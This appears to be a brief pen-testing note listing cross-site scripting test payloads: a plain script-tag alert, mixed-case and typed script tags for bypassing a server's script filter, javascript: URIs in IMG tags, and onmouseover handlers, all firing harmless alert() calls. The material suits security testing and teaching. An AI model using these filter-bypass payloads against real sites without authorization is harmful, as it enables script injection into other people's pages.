# Examples

This is a good list:

https://www.linkedin.com/pulse/20140812222156-79939846-xss-vectors-you-may-need-as-a-pen-tester

## No security
`<script>alert(1)</script>`


Imagine that the server sanitizes `<script>`. To bypass that we can use:
`<SCrIpt>alert(2)</ScRiPt>`
`<script type=text/javascript>alert(2)</script>`

### Using the IMG-tag
```
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG onmouseover="alert('xxs')">
```


### Onmouseover
```
<a onmouseover="alert(2)">d</a>
```
